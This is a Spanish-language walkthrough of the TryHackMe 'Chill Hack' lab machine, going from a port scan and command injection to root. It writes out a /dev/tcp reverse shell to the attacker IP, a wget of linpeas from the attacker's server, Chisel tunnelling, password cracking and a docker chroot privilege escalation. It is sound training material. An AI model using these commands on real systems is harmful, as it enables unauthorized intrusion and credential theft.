---
title: Write-Up Chill Hack
description: Write-Up sobre la máquina Chill Hack de TryHackMe
published: true
date: 2025-01-24T15:53:57.054Z
tags: tryhackme
editor: markdown
dateCreated: 2025-01-24T11:20:08.121Z
---

# Write Up
Bienvenido a mi Write Up de la máquina [Chill Hack de TryHackMe](https://tryhackme.com/r/room/chillhack).  Es una máquina clasificada como fácil y se puede completar en aproximadamente 45 minutos
## Preparación
Antes de comenzar, conectamos el archivo de configuración VPN proporcionado por TryHackMe y comprobamos la conectividad con la máquina objetivo mediante un ping. Las direcciones IP asignadas son:
- KALI: 10.9.3.9
- THM: 10.10.38.123

## Escaneo y primer vistazo
Una vez confirmada la conectividad, realizamos un escaneo de puertos con Nmap:
``` bash
nmap -sT -Pn -sV 10.10.38.123
```
![imagen_hacking_chill-hack_2nmap.png](/imagen_hacking_chill-hack_2nmap.png)

El resultado muestra los siguientes puertos abiertos:
- 21: FTP (Servidor de archivos)
- 22: SSH (Acceso remoto)
- 80: HTTP (Servicio web)

Como no tenemos credenciales para SSH, comenzaremos explorando los servicios HTTP y FTP.
### HTTP
Si nos dirigimos a nuestro navegador y ponemos la IP de nuestra máquina, podemos cargar un servicio web donde parece ser que son cosas de deporte.
![imagen_hacking_chill-hack_3website.png](/imagen_hacking_chill-hack_3website.png)

Podemos hacer un **dirb**, para hacer un escaneo de directorios.
``` bash
dirb http://10.10.38.123
```
![imagen_hacking_chill-hack_10dirb1.png](/imagen_hacking_chill-hack_10dirb1.png)
![imagen_hacking_chill-hack_11dirb2.png](/imagen_hacking_chill-hack_11dirb2.png)
El escaneo nos revela un directorio llamado *secret*, que dentro un **index.html**, así que vamos a mirar que es.
![imagen_hacking_chill-hack_4secret.png](/imagen_hacking_chill-hack_4secret.png)

Una vez dentro, observamos lo que parece ser una terminal, por lo que vamos a poner comandos simples como 
``` bash
whoami
```
Como podemos ver, nuestra página ha cambiado, el comando se ha ejecutado y nos ha devuelto un gif.
![imagen_hacking_chill-hack_5comandobueno.png](/imagen_hacking_chill-hack_5comandobueno.png)

Vamos a intentar crear una shell reversa, recomiendo el uso de [RevShell](https://www.revshells.com).
En nuestra máquina atacante ejecutamos:
```bash
nc -lnvp 9000
```
![imagen_hacking_chill-hack_6shellkali.png](/imagen_hacking_chill-hack_6shellkali.png)
Y en la terminal de la página vamos a poner:
```bash
sh -i >& /dev/tcp/10.9.3.9/9000 0>&1
```
Lamentablemente, parece que el comando no ha funcionado. Volveremos a esto más adelante, antes vamos a ir al servidor FTP
![imagen_hacking_chill-hack_7comandomalo.png](/imagen_hacking_chill-hack_7comandomalo.png)
### Servidor FTP
Nos conectamos al servidor con el usuario *anonymous* sin contraseña.
```bash
ftp 10.10.38.123
```
![imagen_hacking_chill-hack_8ftp.png](/imagen_hacking_chill-hack_8ftp.png)

Haciendo el comando **dir**, podemos listar todo lo que hay y nos podemos encontrar un archivo llamado *note.txt*. Los comandos que hemos puesto ahora son:
``` ftp
dir
get note.txt
```
![imagen_hacking_chill-hack_9get.png](/imagen_hacking_chill-hack_9get.png)

Una vez descargado el archivo, vamos a comprobar lo que hay en el documento.
![imagen_hacking_chill-hack_12note.png](/imagen_hacking_chill-hack_12note.png)
El documento nos dice que un usuario llamado *Anurodh*, ha creado un filtro de comandos, esto está firmado por otro usuario llamado *Apaar*.

Volvamos al HTTP e intentemos entrar, comenzando la fase de **Intrusión**
## Intrusión
Ahora nos queda intentar entrar en el equipo. Para ello se ha intentado varias formas, como puede ser:
1. Subir un archivo con un script que contemple "sh -i >& /dev/tcp/10.9.3.9/9000 0>&1" y se ejecute.
2. Intentar introducir caracteres especiales entre el comando.
3. Dirigirnos directamente a la ruta del ejecutable del comando.

Por lo tanto, dentro de la página web vamos a escribir:
```bash
/bin/bash -i >& /dev/tcp/10.9.3.9/9000 0>&1
```

Una vez escrito esto podemos observar como hemos entrado sin problema.
![imagen_hacking_chill-hack_13intrusion.png](/imagen_hacking_chill-hack_13intrusion.png)
> Recordad que debemos mantener una shell con "nc -lnvp 9000"
{.is-info}

Una vez tengamos acceso, podemos empezar a ejecutar comandos para intentar escalar privilegios.
## Escalada de privilegios y búsqueda de flags
### Usuario www-data
Como podemos observar, somos el usuario **www-data**, usuario creado para interpretar website, recomiendo echar un ojo a el **directorio** en el que estamos, ya que nos será más útil después.

Lo primero que haremos será securizar la shell, para ello vamos a poner los siguientes comandos:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
Tras esto hacemos <kbd>CTRL</kbd> + <kbd>Z</kbd>.
Y escribimos los siguientes comandos:
```
stty raw -echo;
export TERM=xterm
```

Ya tendremos la shell lista. Podemos analizar el contenido del index, para saber porque no podíamos escribir bien los comandos
![imagen_hacking_chill-hack_15website.png](/imagen_hacking_chill-hack_15website.png)
Como podemos observar, es debido a que hay una blacklist de comandos, para dificultarnos uso de la misma.
Ahora lo que vamos a intentar es escalar privilegios como www-data, para ello podemos intentar los comandos:
- id: Mirar los grupos a los que pertenece nuestro usuario.
- sudo -l: Para comprobar los privilegios que tenemos.

Si intentamos el id, no encontraremos nada importante, sin embargo con sudo -l, hemos encontrado que tenemos privilegios en un archivo llamado **.helpline.sh**, que está en la ruta **home** del usuario **apaar**
![imagen_hacking_chill-hack_16privilegios.png](/imagen_hacking_chill-hack_16privilegios.png)

Vamos a ver de qué se trata este script.
```
cat /home/apaar/.helpline.sh
```
![imagen_hacking_chill-hack_17script.png](/imagen_hacking_chill-hack_17catscript.png)
Como podemos observar es donde nos pregunta un nombre, y después enviar un mensaje. Sin embargo este mensaje se envía a una terminal, por lo que podríamos intentar acceder al usuario apaar.
> Esto es debido a que podemos ejecutar el comando como si fuéramos apaar, como se vio anteriormente.
{.is-info}

Primero hacemos una prueba
![imagen_hacking_chill_18scriptejecutado.png](/imagen_hacking_chill-hack_18scriptejecutado.png)

Como podemos ver en la terminal, nos devuelve apaar, por lo que podríamos intentar acceder como este usuario, para poder tener una shell como apagar, vamos a poner en el apartado de mensaje /bin/bash.
![imagen_hacking_chill-hack_19scriptdentro.png](/imagen_hacking_chill-hack_19scriptdentro.png)

### Apaar
Ya podemos apagar, haremos lo mismo. Comprobaremos tanto *id* como *sudo -l*, lamentablemente no tenemos nada interesante para continuar.
![imagen_hacking_chill-hack_31permisosapaar.png](/imagen_hacking_chill-hack_31permisosapaar.png)

Podemos comprobar si vemos algo en el home del usuario para ello hacemos
```bash
cd 
ls
```

Podemos encontrar un txt llamado local, el cual si lo leemos con un cat, podremos obtener la primera flag.
![imagen_hacking_chill-hack_20primeraflag.png](/imagen_hacking_chill-hack_20primeraflag.png)

> En este punto yo estaba en punto muerto, por lo que se ha intentado continuar siguiendo algunos write-up y se recomienda el uso de Linpeas
{.is-danger}

> Linpeas es un software de escaneo de vulnerabilidades y no se recomiendo bajo ninguna circunstancia el uso de esta herramienta para otra cosa que no sea hackeo ético y con el previo permiso del dueño del equipo.

Debido a que no tenemos forma ninguna de continuar, vamos a intentar usar una herramienta llamada Linpeas, que nos permitirá encontrar vulnerabilidades en el sistema.
Nos descargamos linpeas del github oficial: [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master). Nos vamos a descargar el [Linpeas.sh]()

Una vez descargado, vamos a abrir un pequeño servicio web, para que el equipo de TryHackMe lo descargue.
```python
python -m http.server 8000
```
> Ubicar linpeas en la misma carpeta donde abrís el servicio web.
{.is-warning}

![imagen_hacking_chill-hack_21pasarlinpeas.png](/imagen_hacking_chill-hack_21pasarlinpeas.png)

En nuestra shell, vamos a escribir lo siguiente:
```sh
wget http://10.9.3.9:8000/linpeas.sh
```
![imagen_hacking_chill-hack_22obtenerlinpeas.png](/imagen_hacking_chill-hack_22obtenerlinpeas.png)
Una vez lo descargamos, le damos permisos de ejecución y lo ejecutamos
```bash
chmod +x linpeas.sh
./linpeas.sh
```

Si dejamos que Linpeas analicé todo, vamos a encontrar que hay un puerto activo en 127.0.0.1:9001, es decir solo puede entrar por sí mismo, también del puerto 3306 que es MySQL
![imagen_hacking_chill-hack_24informacion_limpeas.png](/imagen_hacking_chill-hack_24informacion_limpeas.png)

Vamos a intentar acceder a él, para ello usaremos la herramienta Chisel
> Ir a la práctica de pivotaje para descargar Chisel y la configuración de los proychains5 [enlace](https://ciberapuntes.com/es/apuntes/ciber/Hacking_Etico/Pivotaje)
{.is-info}

Una vez descargado, vamos a hacer el mismo proceso que hicimos para pasar linpeas, por lo que abrimos de nuevo el servicio web
```python
python -m http.server 8000
```
> Si diera error el puerto 8000, cambiar de puerto, o asegurarse que están todos los procesos terminando con dicho puerto.
{.is-warning}

Tras haberlo descargado y dado los permisos de ejecución, vamos a ejecutarlo.
En nuestra máquina Kali, vamos a poner el siguiente comando
```bash
./chisel server -p 4000 --reverse --socks5
```
![imagen_hacking_chill-hack_27chisel_kali.png](/imagen_hacking_chill-hack_27chisel_kali.png)
Y en la máquina de TryHackMe, vamos a poner lo siguiente:
```bash
./chisel client 10.9.3.9:4000 R:9001:127.0.0.1:9001
```
![imagen_hacking_chill-hack_28chisel_thm.png](/imagen_hacking_chill-hack_28chisel_thm.png)

Teniendo el proxy activado, si acudimos a nuestro navegador y ponemos *127.0.0.1:9001*, podemos ver lo siguiente:
![imagen_hacking_chill-hack_29websitelocalhost.png](/imagen_hacking_chill-hack_29websitelocalhost.png)

No tenemos ningúna de las credenciales, por lo que deberemos volver atrás. Esto nos hace preguntar, ¿Dónde están los archivos de este servicio web?.

Recordamos que los archivos del primer servicio web está en /var/www/html, sin embargo, normalmente sólo hace falta que esté en /var/www, para que se pueda ver. Por lo que hay algo raro.
Si hacemos un ls a la carpeta /var/www, podemos ver lo siguiente
```bash
ls /var/www
```

![imagen_hacking_chill-hack_30websites.png](/imagen_hacking_chill-hack_30websites.png)

Tenemos una carpeta llamada files, si hacemos un ls a está carpeta podemos encontrar más cosas interesantes.
```bash
cd /var/www/files
ls
```
![imagen_hacking_chill-hack_32lsfiles.png](/imagen_hacking_chill-hack_32lsfiles.png)

Tenemos el index, en formato php, es posible que tenga almacenada las credenciales de acceso.

Hacemos por lo tanto un:
```bash
cat index.php
```
![imagen_hacking_chill-hack_33indexfiles.png](/imagen_hacking_chill-hack_33indexfiles.png)
Como observamos en la imagen, tenemos una conexión con una base de datos llamada **webportal**, con un usuario que es **root** y la contraseña es **!@m+her00+@db**

Vamos a probar si funciona. Terminamos la conexión chisel y hacemos un 
```bash
mysql -u root -p
```
![imagen_hacking_chill-hack_34mysql.png](/imagen_hacking_chill-hack_34mysql.png)

Como podemos observar, hemos podido entrar sin problemas, comprobamos que exista la base de datos con
```sql
show databases;
```
![imagen_hacking_chill-hack_35databases.png](/imagen_hacking_chill-hack_35databases.png)
Usamos la base de datos webportal y miramos las tablas que tiene
```sql
use webportal;
show tables;
```
Como podemos observar, tenemos solo una tabla llamada usuarios, por lo que vamos a analizarlo.
![imagen_hacking_chill-hack_36tablas.png](/imagen_hacking_chill-hack_36tablas.png)
Realizamos un select *
```sql
select * from users;
```
![imagen_hacking_chill-hack_37informacion.png](/imagen_hacking_chill-hack_37informacion.png)

Y obtenemos la información de que usuarios se pueden conectar y cuales son sus credenciales, aunque la contraseña está hasheada. Usamos un website como [CrackStation](https://crackstation.net).

Si introducimos las contraseñas podemos decodificarlas.
![imagen_hacking_chill-hack_38dehashed.png](/imagen_hacking_chill-hack_38dehashed.png)

Si usamos cualquiera de los dos usuarios, podemos entrar en el website, volvemos a levantar el chisel y entramos con las credenciales.

---
Una vez dentro, nos va a salir dos textos y una imagen en grande, el texto dice: "Has llegado tan lejos, mira en la oscuridad y encontraras tu respuesta"
![imagen_hacking_chill-hack_39dentrowebsite.png](/imagen_hacking_chill-hack_39dentrowebsite.png)

Nos da la pista de mirar en la oscuridad, esto puede ser que tengamos algo oculto en alguna de las dos imágenes. Por lo que vamos a usar steghide.

Steghide es una herramienta de esteganografía, donde podemos ocultar archivos y documentos en imágenes. También nos sirve para extraer.

Por lo tanto vamos a ir a la carpeta de images, y crear un servicio web ahí
```python
cd images
ls
python3 -m http.server 8000
```
![imagen_hacking_chill-hack_40obtenerimagenes.png](/imagen_hacking_chill-hack_40obtenerimagenes.png)
Y desde nuestra máquina local vamos a obtener los archivos que deseamos, vamos a empezar con el archivo de hacker, ya que a priori es más sencillo de escribir.
```bash
wget http://10.10.38.123:8000/hacker-with-laptop_23-2147985341.jpg
```
![imagen_hacking_chill-hack_41obtenidoimagen.png](/imagen_hacking_chill-hack_41obtenidoimagen.png)

Tras tener la imagen, vamos a empezar a usar las herramientas que hemos comentado anteriormente.
Empezamos con steghide
```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```
Nos pedirá una passphrase, el cúal no podremos nada.
![imagen_hacking_chill-hack_42steghide.png](/imagen_hacking_chill-hack_42steghide.png)
Una vez hecho esto podemos ver que se ha escrito el contenido en backup.zip

Debido a que es un zip, vamos a intentar extraerlo
```bash
unzip backup.zip
```
![imagen_hacking_chill-hack_43zippasword.png](/imagen_hacking_chill-hack_43zippassword.png)
Lamentablemente, nos pide una contraseña. Podemos usar zip2john, para convertir este archivo cifrado en un hash, y ser capaz de romper el hash con john.
Por lo que haremos:
```bash
zip2john backup.zip > hash
```
![imagen_hacking_chill-hack_44ziphash.png](/imagen_hacking_chill-hack_44ziphash.png)

Tras esto, usaremos a John con el diccionario de contraseñas de rockyou.txt

El comando que pondremos será:
```bash
john --wordlist=/usr/share/wordlist/rockyou.txt hash
```
![imagen_hacking_chill-hack_45johnhash.png](/imagen_hacking_chill-hack_45johnhash.png)

Observamos que la contraseña es pass1word.
Ahora si que podremos extraer los ficheros de backup.zip
![imagen_hacking_chill-hack_46unzip.png](/imagen_hacking_chill-hack_46unzip.png)
Nos ha dado un archivo llamado source_code.php, si lo leemos podremos encontrar lo siguiente:
![imagen_hacking_chill-hack_47anurodhpass.png](/imagen_hacking_chill-hack_47anurodhpass.png)

Podemos observar como hay una contraseña cifrada con base64, y si se hace de forma correcta, podemos entrar como Anurodh. Vamos a decodificar la contraseña
```bash
echo IWQwbnRLbjB3bVlwqhnzdzByZA== > base64.txt
cat base64.txt
base64 -d base64.txt
```
![imagen_hacking_chill-hack_48password.png](/imagen_hacking_chill-hack_48password.png)
El resultado de toda esta operación, es que la contraseña es **!d0ntKn0wmYp@ssw0rd**.

Ahora podemos intentar loguearnos como Anurodh. Por lo tanto en la máquina de TryHackMe, vamos a poner:
```bash
su anurodh
```
Y cuando nos pregunte la contraseña ponemos que la hemos obtenido anteriormente.
![imagen_hacking_chill-hack_49anurodh.png](/imagen_hacking_chill-hack_49anurodh.png)
## Anurodh
Ahora somos otro usuario, pero ¿Tenemos los permisos suficientes para entrar como root?
Si hacemos un id;sudo -l, vamos a encontrar algo interesante
```bash
id;sudo -l
```
![imagen_hacking_chill-hack_50idsudol.png](/imagen_hacking_chill-hack_50idsudol.png)
Como observamos en la imagen, pertenecemos a los usuarios del grupo de Docker. Si nos vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell), podemos observar como hay un comando que podemos poner para entrar como root.
```docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Si ponemos este comando podemos ver cómo hemos cambiado a una nueva shell que no tiene mucha información, sin embargo si ponemos **whoami** nos devolverá el root.
![imagen_hacking_chill-hack_51root.png](/imagen_hacking_chill-hack_51root.png)

Como root, podemos buscar la flag, que seguramente esté en el home de root, por lo que vamos a poner
```bash
cd
ls
```
Encontraremos un archivo llamado *proof.txt* y si le hacemos un cat podemos obtener la flag.
```bash
cat proof.txt
```
![imagen_hacking_chill-hack_52final.png](/imagen_hacking_chill-hack_52final.png)


